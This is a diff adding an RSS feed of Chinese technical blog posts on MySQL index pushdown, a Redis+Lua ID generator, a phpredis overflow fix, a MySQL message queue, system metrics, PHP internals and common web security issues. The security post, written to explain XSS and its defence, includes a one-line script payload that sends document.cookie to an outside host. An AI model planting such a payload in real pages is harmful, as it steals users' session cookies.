+| employees | CREATE TABLE `employees` (
+  `emp_no` int(11) NOT NULL,
+  `birth_date` date NOT NULL,
+  `first_name` varchar(14) NOT NULL,
+  `last_name` varchar(16) NOT NULL,
+  `gender` enum(&#39;M&#39;,&#39;F&#39;) NOT NULL,
+  `hire_date` date NOT NULL,
+  PRIMARY KEY (`emp_no`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;建立联合索引&#34;&gt;建立联合索引&lt;/h3&gt;
+
+&lt;p&gt;这个表默认只有一个主索引，因为ICP只能作用于二级索引，所以我们建立一个二级索引：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ALTER TABLE employees.employees ADD INDEX first_name_last_name (first_name, last_name);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;查询&#34;&gt;查询&lt;/h3&gt;
+
+&lt;p&gt;启用profiling并关闭query cache：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;SET profiling = 1;
+SET query_cache_type = 0;
+SET GLOBAL query_cache_size = 0;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;执行查询：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;+----------+------------+-----------------------------------
+| Query_ID | Duration   | Query  |
++----------+------------+-----------------------------------
+|        8 | 0.00054575 | SELECT * FROM employees WHERE first_name=&#39;Mary&#39; AND last_name LIKE &#39;%man&#39;              |
+|        9 | 0.00046400 | SELECT * FROM employees WHERE first_name=&#39;Mary&#39; AND last_name LIKE &#39;%man&#39;              |
+|       10 | 0.00048650 | SELECT * FROM employees WHERE first_name=&#39;Mary&#39; AND last_name LIKE &#39;%man&#39;              |
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;关闭ICP&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;SET optimizer_switch=&#39;index_condition_pushdown=off&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;执行查询&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;+----------+------------+-----------------------------------
+| Query_ID | Duration   | Query  |
++----------+------------+-----------------------------------
+|       12 | 0.00159075 | SELECT * FROM employees WHERE first_name=&#39;Mary&#39; AND last_name LIKE &#39;%man&#39;              |
+|       13 | 0.00109525 | SELECT * FROM employees WHERE first_name=&#39;Mary&#39; AND last_name LIKE &#39;%man&#39;              |
+|       14 | 0.00130850 | SELECT * FROM employees WHERE first_name=&#39;Mary&#39; AND last_name LIKE &#39;%man&#39;              |
++----------+------------+----------------------------------------------------------------------------------------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;通过以上的示例可以很清楚的发现开启和关闭ICP的区别，我们看一下explain&lt;/p&gt;
+
+&lt;p&gt;开启ICP&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SET optimizer_switch=&#39;index_condition_pushdown=on&#39;;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&amp;gt; EXPLAIN SELECT * FROM employees WHERE first_name=&#39;Mary&#39; AND last_name LIKE &#39;%man&#39;\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: SIMPLE
+        table: employees
+         type: ref
+possible_keys: first_name_last_name
+          key: first_name_last_name
+      key_len: 58
+          ref: const
+         rows: 224
+        Extra: Using index condition
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;关闭ICP&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SET optimizer_switch=&#39;index_condition_pushdown=off&#39;;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&amp;gt; EXPLAIN SELECT * FROM employees WHERE first_name=&#39;Mary&#39; AND last_name LIKE &#39;%man&#39;\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: SIMPLE
+        table: employees
+         type: ref
+possible_keys: first_name_last_name
+          key: first_name_last_name
+      key_len: 58
+          ref: const
+         rows: 224
+        Extra: Using where
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;注意Extra的区别，开启ICP是Using index condition，关闭ICP是Using where&lt;/p&gt;
+
+&lt;h3 id=&#34;注意&#34;&gt;注意&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;ICP只能用于二级索引，不能用于主索引。&lt;/li&gt;
+&lt;li&gt;也不是全部where条件都可以用ICP筛选，如果某where条件的字段不在索引中，当然还是要读取整条记录做筛选，在这种情况下，仍然要到server端做where筛选。&lt;/li&gt;
+&lt;li&gt;ICP的加速效果取决于在存储引擎内通过ICP筛选掉的数据的比例。（筛选的数据越多，效果越明显）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;参考资料&#34;&gt;参考资料&lt;/h3&gt;
+
+&lt;p&gt;1.&lt;a href=&#34;https://mariadb.com/kb/en/mariadb/index-condition-pushdown/&#34;&gt;https://mariadb.com/kb/en/mariadb/index-condition-pushdown/&lt;/a&gt;
+ 2.&lt;a href=&#34;http://dev.mysql.com/doc/refman/5.6/en/index-condition-pushdown-optimization.html&#34;&gt;http://dev.mysql.com/doc/refman/5.6/en/index-condition-pushdown-optimization.html&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>redis&#43;lua实现发号器</title>
+      <link>http://xiaojiong.net/2016/01/25/redis-lua%E5%AE%9E%E7%8E%B0%E5%8F%91%E5%8F%B7%E5%99%A8/</link>
+      <pubDate>Mon, 25 Jan 2016 21:58:21 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/01/25/redis-lua%E5%AE%9E%E7%8E%B0%E5%8F%91%E5%8F%B7%E5%99%A8/</guid>
+      <description>
+
+&lt;h3 id=&#34;业务场景&#34;&gt;业务场景&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;拿微博举例：发布微博以后会产生(微博id)，而像微博这样庞大的系统你刚刚发布的微博很可能没有落地。这时你的粉丝看见了你的微博进行评论，需要一个唯一标识（微博id)与评论进行关联。&lt;/li&gt;
+&lt;li&gt;你的主键是需要有意义的，比如你的分表是按日期划分，那么你的主键可能需要是这样的：2015121200000009。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;设计方案&#34;&gt;设计方案&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;号码设计：采用52位二进制数，其中高28位为秒级时间戳，接下来的4位做业务区分，再接下来的4位做随机值（一会说为什么）。最后16位为自增主键。也就说每秒可以产生65535个唯一ID。&lt;/li&gt;
+&lt;li&gt;采用redis+lua的设计方案，不需要持久化。只需要cache，因为redis不具有计算能力，需要结合lua脚本的计算能力。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;问题&#34;&gt;问题&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;如果某一秒钟已经发出1000个号码，但是这一秒服务重启了（很可能宕机以后立即重启，一瞬间），那么会导致这1000个号码会重复发放。&lt;/li&gt;
+&lt;li&gt;此服务是单点的。&lt;/li&gt;
+&lt;li&gt;phpredis扩展有整型溢出的bug&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;解决方案&#34;&gt;解决方案&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;四位随机数会解决服务重启以后发送重复号码的概率。&lt;/li&gt;
+&lt;li&gt;两台机器，一台发奇数，一台偶数。HA可以做轮询。&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.xiaojiong.net/2016/01/13/phpredis%E6%89%A9%E5%B1%95%E4%BF%AE%E5%A4%8D%E8%AE%B0/&#34;&gt;phpredis扩展修复记&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;相关代码&#34;&gt;相关代码&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;-- biz 01 - 15
+local biz = tonumber(KEYS[1])
+-- random 01 - 15
+local random = tonumber(KEYS[2])
+-- id 16位
+local id = redis.call(&amp;quot;INCRBY&amp;quot;, &amp;quot;impulse&amp;quot;, 2)
+if (id) then
+    -- max odd
+    if (id &amp;gt;= 65535 and (id % 2 == 1)) then
+        redis.call(&amp;quot;SET&amp;quot;, &amp;quot;impulse&amp;quot;, -1)
+    end
+    -- max even number
+    if (id &amp;gt;= 65534 and (id %2 == 0)) then
+        redis.call(&amp;quot;SET&amp;quot;, &amp;quot;impulse&amp;quot;, 0)
+    end
+else
+    redis.log(redis.LOG_NOTICE, &amp;quot;impulse id false&amp;quot;)
+    return false
+end
+id = id % 65536
+-- sec 10位
+local sec = redis.call(&amp;quot;TIME&amp;quot;)[1]
+if (sec) then
+    sec = sec - 1420041600
+else 
+    redis.log(redis.LOG_NOTICE, &amp;quot;impulse sec false&amp;quot;)
+    return false
+end
+return sec*16777216 + biz*1048576 + random*65536 + id
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;参考资料&#34;&gt;参考资料&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://ericliang.info/what-kind-of-id-generator-we-need-in-business-systems/&#34;&gt;业务系统需要什么样的ID生成器&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>phpredis扩展修复记</title>
+      <link>http://xiaojiong.net/2016/01/13/phpredis%E6%89%A9%E5%B1%95%E4%BF%AE%E5%A4%8D%E8%AE%B0/</link>
+      <pubDate>Wed, 13 Jan 2016 22:08:17 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/01/13/phpredis%E6%89%A9%E5%B1%95%E4%BF%AE%E5%A4%8D%E8%AE%B0/</guid>
+      <description>
+
+&lt;p&gt;最近由于项目需要，我在用php+redis+lua开发项目的时候发现一个bug&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    $redis = new Redis();
+    $redis-&amp;gt;connect(&#39;127.0.0.1&#39;, 6379);
+    $res = $redis-&amp;gt;eval(&#39;return 32140378*16777216&#39;);
+    var_dump($res);
+    实际的结果：1509949440
+    正确的结果：539226064027648
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;定位问题&#34;&gt;定位问题&lt;/h3&gt;
+
+&lt;p&gt;首先在定位问题在哪？我首先用redis在shell里直接执行lua脚本，发现结果正确。排除redis与lua兼容性的问题，那么问题可以确定是phpredis扩展的问题。于是我从pecl上下载最新的2.2.7版本，重新安装扩展，结果还是如此。&lt;/p&gt;
+
+&lt;h3 id=&#34;解决问题&#34;&gt;解决问题&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;首先想到的就是搜索引擎，在尝试各种关键字+各种搜索引擎无果。&lt;/li&gt;
+&lt;li&gt;去stackoverflow看看老外有什么好办法没。还是不行~&lt;/li&gt;
+&lt;li&gt;去github上提交问题 &lt;a href=&#34;https://github.com/phpredis/phpredis/issues/718&#34;&gt;issues-718&lt;/a&gt;。还是不行~&lt;/li&gt;
+&lt;li&gt;只好自己看phpredis扩展源码解决了，发现library.c 中 replay_info 为int去掉符号位，也就是说只要eval返回值大于2^31-1就会溢出~修改为long int，发现bugfix。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;github&#34;&gt;github&lt;/h3&gt;
+
+&lt;p&gt;为了以后其他人别踩这个坑，也为了开源事业做贡献，提交我的修复到：&lt;a href=&#34;https://github.com/phpredis/phpredis/pull/724&#34;&gt;pull-724&lt;/a&gt;。
+我第一次在github上提交版本过程中特别感谢&lt;a href=&#34;https://github.com/michael-grunder&#34;&gt;michael-grunder&lt;/a&gt;对我的帮助。&lt;/p&gt;
+
+&lt;h3 id=&#34;鸣谢&#34;&gt;鸣谢&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/walu/phpbook&#34;&gt;PHP扩展开发及内核应用&lt;/a&gt;
+&lt;a href=&#34;http://www.laruence.com/&#34;&gt;鸟哥的博客&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>用mysql实现消息队列</title>
+      <link>http://xiaojiong.net/2016/01/04/%E7%94%A8mysql%E5%AE%9E%E7%8E%B0%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</link>
+      <pubDate>Mon, 04 Jan 2016 21:04:15 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/01/04/%E7%94%A8mysql%E5%AE%9E%E7%8E%B0%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</guid>
+      <description>
+
+&lt;p&gt;在复杂的系统中，为了解耦业务之间的耦合关系，往往需要消息队列来实现模块之间的异步通信。消息队列要满足以下要求：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;消息不能丢失，最好能只被处理一次&lt;/li&gt;
+&lt;li&gt;FIFO顺序&lt;/li&gt;
+&lt;li&gt;支持多生产者&lt;/li&gt;
+&lt;li&gt;支持多消费者，每一个消息只能被一个消费者处理。&lt;/li&gt;
+&lt;li&gt;支持并行消费&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;表结构&#34;&gt;表结构&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;CREATE TABLE `queue` (
+  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
+  `biz` int(11) DEFAULT NULL COMMENT &#39;业务号&#39;,
+  `conn_id` int(11) unsigned DEFAULT &#39;0&#39; COMMENT &#39;连接ID&#39;,
+  `status` enum(&#39;y&#39;,&#39;run&#39;,&#39;n&#39;) DEFAULT &#39;n&#39; COMMENT &#39;状态（n=&amp;gt;未处理，run=&amp;gt;处理中，y=&amp;gt;处理完毕）&#39;,
+  `data_string` text COMMENT &#39;数据载体&#39;,
+  `times` int(10) DEFAULT NULL COMMENT &#39;入库时间&#39;,
+  `update_times` int(10) DEFAULT NULL COMMENT &#39;状态更新时间&#39;,
+  PRIMARY KEY (`id`),
+  KEY `biz` (`biz`,`conn_id`,`status`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;实现方案&#34;&gt;实现方案&lt;/h3&gt;
+
+&lt;p&gt;为了支持FIFO顺序，可以用MySql的自增ID来排序，先进入的消息ID要小些。MySql数据库是支持并发操作的，这就自动支持了多生产者的情况。为了支持多消费者并且每个消息只被一个消费者处理，可以为每个消费者分配一个ID，当某个消息正在被消费者处理时，这个消费者就被认为是这个消息的所有者。&lt;/p&gt;
+
+&lt;p&gt;关键在于怎么支持并发，怎么设置所有者？&lt;/p&gt;
+
+&lt;h4 id=&#34;一-入队列&#34;&gt;一、入队列&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;INSERT INTO `queue` (`biz`, `data_string`, `times`) VALUES (&#39;1000&#39;, &#39;test&#39;, &#39;1451889723&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;二-出队列&#34;&gt;二、出队列&lt;/h4&gt;
+
+&lt;p&gt;1.获取未被处理的消息，首先先占用这些消息，成为这些消息的所有者。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;UPDATE `queue` SET `status` = &#39;run&#39;, `update_times` = 1451879201, `conn_id` = CONNECTION_ID() WHERE `conn_id` = 0 AND `status` = &#39;n&#39; LIMIT x
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据mysql_affected_rows()的返回结果可以判断是否有未被处理的消息。若有，则取出消息：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;SELECT `id`, `biz`, `status`, `times`, `data_string` FROM `athena_queue` WHERE `biz` = 1000 AND `conn_id` = CONNECTION_ID() AND `status` = &#39;run&#39; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;2.处理消息，此时表不会被锁住，其它消费者也可以获取消息；
+3.处理完毕后从数据库中更新&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;UPDATE `queue` SET `status` = &#39;y&#39;, `update_times` = 1451879201 WHERE `id` = xxx, `conn_id` = xxx AND `status` = &#39;run&#39; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;如果在1和2之间有一个消费者进程被kill了，那么该进程获取的消息将永远无法被处理了。&lt;/p&gt;
+
+&lt;h4 id=&#34;三-失败的处理&#34;&gt;三、失败的处理&lt;/h4&gt;
+
+&lt;p&gt;方案一：启动一个监护进程，定期去检查一下是否有超过一定时间限制，并且不在当前连接列表中的消息，并重置他们。可以使用:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;SHOW PROCESSLIST 可以获取当前所有的连接ID
+UPDATE `queue` SET `status` = &#39;n&#39;, `update_times` = 1451879201, `conn_id` = 0 WHERE `conn_id` NOT IN (xxx) AND `status` = &#39;run&#39; AND `update_times` &amp;lt; xxx
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;方案二：将出库的第1步改为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;UPDATE `queue` SET `status` = &#39;n&#39;, `update_times` = 1451879201, `conn_id` = 0 WHERE (`conn_id` = 0 AND `status` = &#39;n&#39; ) OR (`conn_id` NOT IN (xxx) AND `status` = &#39;run&#39; AND `update_times` &amp;lt; xxx) limit xxx;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这样即使消费者A在第1步和第2步之间失败了，消费者B还可以重新取出该消息重新处理。所以只要还有消费者在，消息至少会被处理一次。&lt;/p&gt;
+
+&lt;h4 id=&#34;四-如何实现只处理一次呢&#34;&gt;四、如何实现只处理一次呢？&lt;/h4&gt;
+
+&lt;p&gt;如果消费者在第2步和第3步之间失败的话，这个消息就会被再次取出来处理一次，这样就一共处理了2次。要保证每个消息只被处理一次，也就是要保证第2步和第3步是一个原子操作，要么都做，要么都不做。在第2步和第3步开启事务。&lt;/p&gt;
+
+&lt;p&gt;参考资料
+&lt;a href=&#34;http://www.oreilly.com.cn/index.php?func=book&amp;amp;isbn=978-7-121-19885-4&#34;&gt;高性能MYSQL(第三版)&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>常见的web安全问题</title>
+      <link>http://xiaojiong.net/2015/12/25/%E5%B8%B8%E8%A7%81%E7%9A%84web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</link>
+      <pubDate>Fri, 25 Dec 2015 21:35:06 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2015/12/25/%E5%B8%B8%E8%A7%81%E7%9A%84web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</guid>
+      <description>
+
+&lt;h3 id=&#34;xss&#34;&gt;XSS&lt;/h3&gt;
+
+&lt;p&gt;XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。&lt;/p&gt;
+
+&lt;h3 id=&#34;xss攻击&#34;&gt;XSS攻击&lt;/h3&gt;
+
+&lt;p&gt;a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;window.open(“www.b.com?param=”+document.cookie)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。&lt;/p&gt;
+
+&lt;h3 id=&#34;xss防御&#34;&gt;XSS防御&lt;/h3&gt;
+
+&lt;p&gt;永远不要相信用户传过来的数据
+php可以使用htmlspecialchars函数，将html标签转义。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    htmlspecialchars();
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>常用系统指标及计算方法</title>
+      <link>http://xiaojiong.net/2015/12/22/%E5%B8%B8%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%8C%87%E6%A0%87%E5%8F%8A%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</link>
+      <pubDate>Tue, 22 Dec 2015 22:50:05 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2015/12/22/%E5%B8%B8%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%8C%87%E6%A0%87%E5%8F%8A%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</guid>
+      <description>
+
+&lt;h3 id=&#34;qps&#34;&gt;QPS:&lt;/h3&gt;
+
+&lt;p&gt;每秒查询率(Query Per Second) ,每秒的响应请求数，是一台服务器每秒能够相应的查询次数，是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准，也即是最大吞吐能力。
+QPS = req/sec = 请求数/秒
+QPS统计方式 [一般使用 http_load 进行统计]
+QPS = 总请求数 / ( 进程总数 * 请求时间 )
+QPS: 单个进程每秒请求服务器的成功次数
+峰值QPS:
+原理：每天80%的访问集中在20%的时间里，这20%时间叫做峰值时间
+公式：( 总PV数 * 80% ) / ( 每天秒数 * 20% ) = 峰值时间每秒请求数(QPS)&lt;/p&gt;
+
+&lt;h3 id=&#34;pv&#34;&gt;PV:&lt;/h3&gt;
+
+&lt;p&gt;访问量即Page View, 即页面浏览量或点击量，用户每次刷新即被计算一次
+单台服务器每天PV计算
+公式1：每天总PV = QPS * 3600 * 6
+公式2：每天总PV = QPS * 3600 * 8
+服务器数量：
+机器：峰值时间每秒QPS / 单台机器的QPS = 需要的机器
+机器：ceil( 每天总PV / 单台服务器每天总PV )&lt;/p&gt;
+
+&lt;p&gt;例子：
+每天300w PV 的在单台机器上，这台机器需要多少QPS？
+答：( 3000000 * 0.8 ) / (86400 * 0.2 ) = 139 (QPS)
+如果一台机器的QPS是58，需要几台机器来支持？
+答：139 / 58 = 3&lt;/p&gt;
+
+&lt;h3 id=&#34;并发数&#34;&gt;并发数：&lt;/h3&gt;
+
+&lt;p&gt;并发用户数是指系统可以同时承载的正常使用系统功能的用户的数量。
+系统同时处理的request/事务数&lt;/p&gt;
+
+&lt;h3 id=&#34;吐吞量&#34;&gt;吐吞量：&lt;/h3&gt;
+
+&lt;p&gt;吞吐量是指系统在单位时间内处理请求的数量&lt;/p&gt;
+
+&lt;h3 id=&#34;响应时间-rt&#34;&gt;响应时间（RT):&lt;/h3&gt;
+
+&lt;p&gt;响应时间是指系统对请求作出响应的时间
+响应时间：  一般取平均响应时间
+QPS（TPS）= 并发数/平均响应时间&lt;/p&gt;
+
+&lt;h3 id=&#34;tps&#34;&gt;TPS&lt;/h3&gt;
+
+&lt;p&gt;TPS是TransactionsPerSecond的缩写，也就是事务数/秒。它是软件测试结果的测量单位。一个事务是指一个客户机向服务器发送请求然后服务器做出反应的过程。客户机在发送请求时开始计时，收到服务器响应后结束计时，以此来计算使用的时间和完成的事务个数，最终利用这些信息来估计得分。客户机使用加权协函数平均方法来计算客户机的得分，测试软件就是利用客户机的这些信息使用加权协函数平均方法来计算服务器端的整体TPS得分。&lt;/p&gt;
+
+&lt;h3 id=&#34;uv&#34;&gt;UV:&lt;/h3&gt;
+
+&lt;p&gt;独立访客即Unique Visitor,访问您网站的一台电脑客户端为一个访客。00:00-24:00内相同的客户端只被计算一次&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>关于php变量的那点儿事</title>
+      <link>http://xiaojiong.net/2015/12/18/%E5%85%B3%E4%BA%8Ephp%E5%8F%98%E9%87%8F%E7%9A%84%E9%82%A3%E7%82%B9%E5%84%BF%E4%BA%8B/</link>
+      <pubDate>Fri, 18 Dec 2015 22:22:46 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2015/12/18/%E5%85%B3%E4%BA%8Ephp%E5%8F%98%E9%87%8F%E7%9A%84%E9%82%A3%E7%82%B9%E5%84%BF%E4%BA%8B/</guid>
+      <description>
+
+&lt;p&gt;PHP属于弱类型语言：一个变量可以表示任意的数据类型。&lt;/p&gt;
+
+&lt;p&gt;PHP之所以成为一个简单而强大的语言，很大一部分的原因是它拥有弱类型的变量。 但是有些时候这也是一把双刃剑，使用不当也会带来一些问题。就像仪器一样，越是功能强大， 出现错误的可能性也就越大。&lt;/p&gt;
+
+&lt;p&gt;在官方的PHP实现内部，所有变量使用同一种数据结构(zval)来保存，而这个结构同时表示PHP中的各种数据类型。 它不仅仅包含变量的值，也包含变量的类型。这就是PHP弱类型的核心。&lt;/p&gt;
+
+&lt;h3 id=&#34;一-php变量类型&#34;&gt;一、PHP变量类型&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;标量类型： boolean、integer、float(double)、string&lt;/li&gt;
+&lt;li&gt;复合类型： array、object&lt;/li&gt;
+&lt;li&gt;特殊类型： resource、NULL&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;二-php变量存储结构&#34;&gt;二、PHP变量存储结构&lt;/h3&gt;
+
+&lt;p&gt;前面提到变量的值存储在zvalue_value联合体中，结构体定义如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;typedef union _zvalue_value {
+    long lval;                  /* long value */
+    double dval;                /* double value */
+    struct {
+        char *val;
+        int len;
+    } str;
+    HashTable *ht;              /* hash table value */
+    zend_object_value obj;
+} zvalue_value;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;使用联合体而不是用结构体是出于空间利用率的考虑，因为一个变量同时只能属于一种类型。 如果使用结构体的话将会不必要的浪费空间，而PHP中的所有逻辑都围绕变量来进行的，这样的话， 内存浪费将是十分大的。这种做法成本小但收益非常大。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;字符串string&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code&gt;struct {
+    char *val;
+    int len;
+} str;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这里字符串使用的是一个结构体，额外存储了一个长度值，所以导致strlen()函数可以在常数时间内获取到字符串的长度。这种是典型的牺牲空间换时间的做法。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;对象
+（略）&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;数组
+PHP中数组的实现是哈希表+链表的方式存储。参见：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://www.xiaojiong.net/2015/12/12/PHP%E4%B8%AD%E7%9A%84%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%88HashTable%EF%BC%89/&#34;&gt;PHP中的哈希表&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://www.xiaojiong.net/2015/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%8D%EF%BC%8D%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/&#34;&gt;数据结构&amp;ndash;双向链表&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
